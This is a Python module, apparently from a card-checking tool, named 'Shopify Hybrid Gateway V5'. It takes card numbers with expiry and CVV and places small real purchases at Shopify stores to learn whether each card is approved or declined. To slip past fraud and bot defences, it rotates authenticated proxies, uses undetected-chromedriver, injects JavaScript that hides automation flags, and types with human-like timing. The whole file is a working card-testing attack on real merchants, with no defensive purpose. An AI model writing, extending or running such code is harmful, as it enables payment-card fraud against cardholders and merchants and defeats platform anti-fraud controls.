"""
Shopify Hybrid Gateway V5 - ENHANCED STEALTH + BROWSER DETECTION FIX
Fixes browser detection issue that caused "browser not supported" errors
"""

import time
import random
import logging
from typing import Optional, Tuple, List
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import undetected_chromedriver as uc

from .shopify_store_database import ShopifyStoreDatabase
from .shopify_product_finder import DynamicProductFinder
from .proxy_parser import ProxyParser

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class ShopifyHybridGatewayV5:
    """
    V5: Enhanced stealth to bypass Shopify's browser detection
    
    Key Improvements:
    - Better undetected-chromedriver configuration
    - Enhanced stealth JavaScript injection
    - Improved response detection (handles browser errors)
    - Better timing and human-like behavior
    """
    
    def __init__(self, proxy_file: str = 'proxies.txt', headless: bool = False):
        """Initialize gateway with proxy support (headless=False for better stealth)"""
        self.store_db = ShopifyStoreDatabase()
        self.product_finder = DynamicProductFinder()
        self.headless = headless  # Default False for better stealth
        self.driver = None
        
        # Load proxies
        self.proxies = self._load_proxies(proxy_file)
        self.current_proxy_index = 0
        
        logger.info(f"✅ Loaded {len(self.proxies)} proxies")
    
    def _load_proxies(self, proxy_file: str) -> List[str]:
        """Load and parse proxies from file"""
        proxies = []
        try:
            with open(proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        parsed = ProxyParser.parse(line)
                        if parsed:
                            proxies.append(parsed)
        except FileNotFoundError:
            logger.warning(f"⚠️  Proxy file not found: {proxy_file}")
        
        return proxies
    
    def _get_next_proxy(self) -> Optional[str]:
        """Get next proxy from rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy
    
    def _create_proxy_extension(self, host: str, port: str, user: str, password: str) -> str:
        """Create Chrome extension for proxy authentication"""
        import zipfile
        
        manifest_json = """
{
    "version": "1.0.0",
    "manifest_version": 2,
    "name": "Chrome Proxy",
    "permissions": [
        "proxy",
        "tabs",
        "unlimitedStorage",
        "storage",
        "<all_urls>",
        "webRequest",
        "webRequestBlocking"
    ],
    "background": {
        "scripts": ["background.js"]
    },
    "minimum_chrome_version":"22.0.0"
}
"""
        
        background_js = """
var config = {
        mode: "fixed_servers",
        rules: {
          singleProxy: {
            scheme: "http",
            host: "%s",
            port: parseInt(%s)
          },
          bypassList: ["localhost"]
        }
      };

chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

function callbackFn(details) {
    return {
        authCredentials: {
            username: "%s",
            password: "%s"
        }
    };
}

chrome.webRequest.onAuthRequired.addListener(
            callbackFn,
            {urls: ["<all_urls>"]},
            ['blocking']
);
""" % (host, port, user, password)
        
        plugin_path = '/tmp/proxy_auth_plugin.zip'
        
        with zipfile.ZipFile(plugin_path, 'w') as zp:
            zp.writestr("manifest.json", manifest_json)
            zp.writestr("background.js", background_js)
        
        return plugin_path
    
    def _inject_stealth_js(self, driver: webdriver.Chrome):
        """Inject stealth JavaScript to avoid detection"""
        stealth_js = """
        // Overwrite the `plugins` property to use a custom getter.
        Object.defineProperty(navigator, 'plugins', {
            get: () => [1, 2, 3, 4, 5]
        });
        
        // Overwrite the `languages` property to use a custom getter.
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en']
        });
        
        // Overwrite the `webdriver` property to return false
        Object.defineProperty(navigator, 'webdriver', {
            get: () => false
        });
        
        // Mock chrome object
        window.chrome = {
            runtime: {}
        };
        
        // Mock permissions
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );
        """
        
        try:
            driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                'source': stealth_js
            })
            logger.info("✓ Injected stealth JavaScript")
        except Exception as e:
            logger.warning(f"⚠️  Could not inject stealth JS: {e}")
    
    def _setup_browser_with_proxy(self, proxy: Optional[str] = None) -> webdriver.Chrome:
        """Setup undetected Chrome with enhanced stealth"""
        options = uc.ChromeOptions()
        
        # Stealth options
        if self.headless:
            options.add_argument('--headless=new')
        
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--start-maximized')
        
        # Additional stealth
        options.add_argument('--disable-web-security')
        options.add_argument('--disable-features=IsolateOrigins,site-per-process')
        options.add_argument('--allow-running-insecure-content')
        
        # Realistic user agent
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
        options.add_argument(f'user-agent={random.choice(user_agents)}')
        
        # Proxy configuration
        if proxy:
            logger.info(f"🔄 Using proxy: {proxy}")
            components = ProxyParser.extract_components(proxy)
            if components:
                protocol, host, port, user, password = components
                if user and password:
                    plugin_file = self._create_proxy_extension(host, port, user, password)
                    options.add_extension(plugin_file)
                else:
                    options.add_argument(f'--proxy-server={protocol}://{host}:{port}')
        
        # Create driver with version_main=None for auto-detection
        driver = uc.Chrome(options=options, version_main=None, use_subprocess=True)
        driver.set_page_load_timeout(45)
        
        # Inject stealth JavaScript
        self._inject_stealth_js(driver)
        
        return driver
    
    def _random_delay(self, min_sec: float = 1.0, max_sec: float = 3.0):
        """Random delay for human-like behavior"""
        time.sleep(random.uniform(min_sec, max_sec))
    
    def _check_for_browser_error(self, driver: webdriver.Chrome) -> bool:
        """Check if Shopify blocked the browser"""
        try:
            page_source = driver.page_source.lower()
            
            # Check for browser compatibility errors
            if any(x in page_source for x in [
                'browser version isn\'t supported',
                'browser isn\'t supported',
                'please update your browser',
                'unsupported browser'
            ]):
                logger.error("✗ Browser detected as unsupported by Shopify")
                return True
            
            return False
        except:
            return False
    
    def _fill_checkout_form(self, driver: webdriver.Chrome, card_number: str,
                           exp_month: str, exp_year: str, cvv: str) -> bool:
        """
        Fill COMPLETE checkout form (shipping + payment on same page)
        Enhanced with better error handling and browser detection
        """
        try:
            logger.info("→ Filling complete checkout form...")
            
            # Wait for page to load
            self._random_delay(3.0, 5.0)
            
            # Check for browser errors
            if self._check_for_browser_error(driver):
                logger.error("✗ Browser blocked by Shopify - try without headless mode")
                return False
            
            # STEP 1: Fill shipping/contact information
            logger.info("→ Step 1: Filling contact & shipping...")
            
            # Email
            try:
                email_field = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "email"))
                )
                email_field.clear()
                self._random_delay(0.2, 0.4)
                # Type slowly like human
                for char in "test@example.com":
                    email_field.send_keys(char)
                    time.sleep(random.uniform(0.05, 0.15))
                logger.info("✓ Filled email")
            except:
                logger.warning("⚠️  Could not fill email")
            
            # Shipping fields
            shipping_fields = {
                'lastName': 'Doe',
                'address1': '123 Main St',
                'city': 'New York',
                'postalCode': '10001',
            }
            
            for field_id, value in shipping_fields.items():
                try:
                    self._random_delay(0.3, 0.6)
                    field = driver.find_element(By.ID, field_id)
                    field.clear()
                    self._random_delay(0.1, 0.2)
                    # Type slowly
                    for char in value:
                        field.send_keys(char)
                        time.sleep(random.uniform(0.05, 0.12))
                    logger.info(f"✓ Filled {field_id}")
                except Exception as e:
                    logger.warning(f"⚠️  Could not fill {field_id}: {e}")
            
            logger.info("✓ Filled shipping information")
            
            # STEP 2: Fill payment information (in iframes)
            logger.info("→ Step 2: Filling payment information...")
            
            self._random_delay(2.0, 3.0)
            
            # Find iframes
            iframes = driver.find_elements(By.TAG_NAME, "iframe")
            logger.info(f"→ Found {len(iframes)} iframes")
            
            # Track which fields we've filled
            filled_card = False
            filled_expiry = False
            filled_cvv = False
            filled_name = False
            
            # Try each iframe
            for i, iframe in enumerate(iframes):
                try:
                    driver.switch_to.frame(iframe)
                    logger.info(f"→ Checking iframe {i}...")
                    
                    # Look for card number field
                    if not filled_card:
                        card_selectors = [
                            (By.ID, "number"),
                            (By.NAME, "number"),
                            (By.CSS_SELECTOR, "input[placeholder*='Card']"),
                            (By.CSS_SELECTOR, "input[placeholder*='card']"),
                            (By.CSS_SELECTOR, "input[autocomplete='cc-number']"),
                        ]
                        
                        for selector_type, selector in card_selectors:
                            try:
                                field = driver.find_element(selector_type, selector)
                                if field.is_displayed() and field.is_enabled():
                                    field.click()
                                    self._random_delay(0.3, 0.6)
                                    field.clear()
                                    # Type slowly like human
                                    for char in card_number:
                                        field.send_keys(char)
                                        time.sleep(random.uniform(0.08, 0.18))
                                    logger.info("✓ Filled card number")
                                    filled_card = True
                                    break
                            except:
                                continue
                    
                    # Look for expiry field
                    if not filled_expiry:
                        expiry_selectors = [
                            (By.ID, "expiry"),
                            (By.NAME, "expiry"),
                            (By.CSS_SELECTOR, "input[placeholder*='MM']"),
                            (By.CSS_SELECTOR, "input[placeholder*='expir']"),
                            (By.CSS_SELECTOR, "input[autocomplete='cc-exp']"),
                        ]
                        
                        for selector_type, selector in expiry_selectors:
                            try:
                                field = driver.find_element(selector_type, selector)
                                if field.is_displayed() and field.is_enabled():
                                    field.click()
                                    self._random_delay(0.2, 0.4)
                                    field.clear()
                                    expiry_value = f"{exp_month}{exp_year[-2:]}"
                                    for char in expiry_value:
                                        field.send_keys(char)
                                        time.sleep(random.uniform(0.05, 0.12))
                                    logger.info("✓ Filled expiry")
                                    filled_expiry = True
                                    break
                            except:
                                continue
                    
                    # Look for CVV field
                    if not filled_cvv:
                        cvv_selectors = [
                            (By.ID, "verification_value"),
                            (By.NAME, "verification_value"),
                            (By.CSS_SELECTOR, "input[placeholder*='CVV']"),
                            (By.CSS_SELECTOR, "input[placeholder*='Security']"),
                            (By.CSS_SELECTOR, "input[autocomplete='cc-csc']"),
                        ]
                        
                        for selector_type, selector in cvv_selectors:
                            try:
                                field = driver.find_element(selector_type, selector)
                                if field.is_displayed() and field.is_enabled():
                                    field.click()
                                    self._random_delay(0.2, 0.4)
                                    field.clear()
                                    for char in cvv:
                                        field.send_keys(char)
                                        time.sleep(random.uniform(0.05, 0.12))
                                    logger.info("✓ Filled CVV")
                                    filled_cvv = True
                                    break
                            except:
                                continue
                    
                    # Look for name field
                    if not filled_name:
                        name_selectors = [
                            (By.ID, "name"),
                            (By.NAME, "name"),
                            (By.CSS_SELECTOR, "input[placeholder*='Name']"),
                            (By.CSS_SELECTOR, "input[placeholder*='name']"),
                            (By.CSS_SELECTOR, "input[autocomplete='cc-name']"),
                        ]
                        
                        for selector_type, selector in name_selectors:
                            try:
                                field = driver.find_element(selector_type, selector)
                                if field.is_displayed() and field.is_enabled():
                                    field.click()
                                    self._random_delay(0.2, 0.4)
                                    field.clear()
                                    for char in "John Doe":
                                        field.send_keys(char)
                                        time.sleep(random.uniform(0.05, 0.12))
                                    logger.info("✓ Filled name on card")
                                    filled_name = True
                                    break
                            except:
                                continue
                    
                    # Switch back
                    driver.switch_to.default_content()
                    
                except Exception as e:
                    logger.debug(f"Error in iframe {i}: {e}")
                    driver.switch_to.default_content()
                    continue
            
            # Check if we filled all required fields
            if filled_card and filled_expiry and filled_cvv:
                logger.info("✓ Successfully filled all payment fields")
                return True
            else:
                logger.error(f"✗ Missing fields - Card:{filled_card} Expiry:{filled_expiry} CVV:{filled_cvv}")
                return False
            
        except Exception as e:
            logger.error(f"✗ Error filling checkout form: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def check(self, card_data: str, amount: float = 1.0,
              max_store_attempts: int = 3) -> Tuple[str, str, str]:
        """Check card with enhanced stealth and browser detection"""
        
        # Parse card
        try:
            parts = card_data.split('|')
            if len(parts) != 4:
                return "error", "Invalid card format", "Unknown"
            
            card_number, exp_month, exp_year, cvv = parts
            card_type = self._detect_card_type(card_number)
            
        except Exception as e:
            return "error", f"Card parse error: {e}", "Unknown"
        
        # Load stores
        if not self.store_db.stores:
            self.store_db.load_stores()
        
        stores = self.store_db.get_stores_by_price_range(
            amount * 0.5, amount * 2.0, limit=max_store_attempts
        )
        
        if not stores:
            return "error", "No stores found", card_type
        
        logger.info(f"→ Found {len(stores)} stores to try")
        
        # Try each store
        for attempt, store in enumerate(stores, 1):
            logger.info(f"\n{'='*60}")
            logger.info(f"ATTEMPT {attempt}/{len(stores)}")
            logger.info(f"Store: {store['url']}")
            logger.info(f"{'='*60}")
            
            proxy = self._get_next_proxy()
            
            try:
                self.driver = self._setup_browser_with_proxy(proxy)
                
                # Find product
                product = self.product_finder.find_product_at_price(store['url'], amount)
                
                if not product:
                    logger.warning("⚠️  No suitable product found")
                    self.driver.quit()
                    continue
                
                logger.info(f"✓ Found product: {product['title']} (${product['price']})")
                
                # Navigate to checkout
                store_url = store['url']
                if not store_url.startswith('http'):
                    store_url = f"https://{store_url}"
                
                checkout_url = f"{store_url}/cart/{product['variant_id']}:1"
                logger.info(f"→ Navigating to: {checkout_url}")
                
                self.driver.get(checkout_url)
                self._random_delay(4.0, 6.0)
                
                # Check for browser errors
                if self._check_for_browser_error(self.driver):
                    logger.error("✗ Browser blocked - skipping to next store")
                    self.driver.quit()
                    continue
                
                # Fill complete checkout form (shipping + payment)
                if not self._fill_checkout_form(self.driver, card_number, exp_month, exp_year, cvv):
                    logger.warning("⚠️  Failed to fill checkout form")
                    self.driver.quit()
                    continue
                
                # Submit payment
                logger.info("→ Submitting payment...")
                self._random_delay(1.5, 2.5)
                
                submit_selectors = [
                    (By.ID, "checkout-pay-button"),
                    (By.CSS_SELECTOR, "button[type='submit']"),
                    (By.XPATH, "//button[contains(text(), 'Pay')]"),
                    (By.XPATH, "//button[contains(text(), 'Complete')]"),
                ]
                
                submitted = False
                for selector_type, selector in submit_selectors:
                    try:
                        button = self.driver.find_element(selector_type, selector)
                        if button.is_displayed() and button.is_enabled():
                            button.click()
                            logger.info("✓ Clicked submit button")
                            submitted = True
                            break
                    except:
                        continue
                
                if not submitted:
                    logger.warning("⚠️  Could not find submit button")
                    self.driver.quit()
                    continue
                
                # Wait for response
                logger.info("→ Waiting for payment response...")
                self._random_delay(6.0, 10.0)
                
                # Check result
                current_url = self.driver.current_url
                page_source = self.driver.page_source.lower()
                
                # Check for browser errors again
                if self._check_for_browser_error(self.driver):
                    logger.error("✗ Browser blocked after submission")
                    self.driver.quit()
                    continue
                
                # Success indicators
                if any(x in current_url.lower() or x in page_source for x in [
                    'thank you', 'thank_you', 'thankyou',
                    'order confirmed', 'order-confirmed',
                    'payment successful', 'payment-successful',
                    '/orders/', 'order-status'
                ]):
                    logger.info("✓ Payment APPROVED")
                    self.driver.quit()
                    return "approved", f"Card charged via {store['url']}", card_type
                
                # Decline indicators
                if any(x in page_source for x in [
                    'declined', 'card was declined', 'card has been declined',
                    'payment failed', 'payment-failed',
                    'insufficient funds', 'insufficient-funds',
                    'invalid card', 'invalid-card',
                    'expired', 'card expired'
                ]):
                    logger.info("✗ Payment DECLINED")
                    self.driver.quit()
                    return "declined", "Card declined", card_type
                
                # Unknown
                logger.warning("⚠️  Unknown response")
                
                # Save debug info
                try:
                    with open('/tmp/shopify_v5_response.html', 'w') as f:
                        f.write(self.driver.page_source)
                    logger.info("→ Saved response to /tmp/shopify_v5_response.html")
                except:
                    pass
                
                self.driver.quit()
                return "unknown", f"Response unclear: {current_url}", card_type
                
            except Exception as e:
                logger.error(f"✗ Error: {e}")
                if self.driver:
                    try:
                        self.driver.quit()
                    except:
                        pass
                continue
        
        return "error", "All attempts failed", card_type
    
    def _detect_card_type(self, card_number: str) -> str:
        """Detect card type"""
        card_number = card_number.replace(' ', '')
        
        if card_number.startswith('4'):
            return 'Visa'
        elif card_number.startswith(('51', '52', '53', '54', '55')):
            return 'Mastercard'
        elif card_number.startswith(('34', '37')):
            return 'American Express'
        elif card_number.startswith('6'):
            return 'Discover'
        else:
            return 'Unknown'
    
    def __del__(self):
        """Cleanup"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
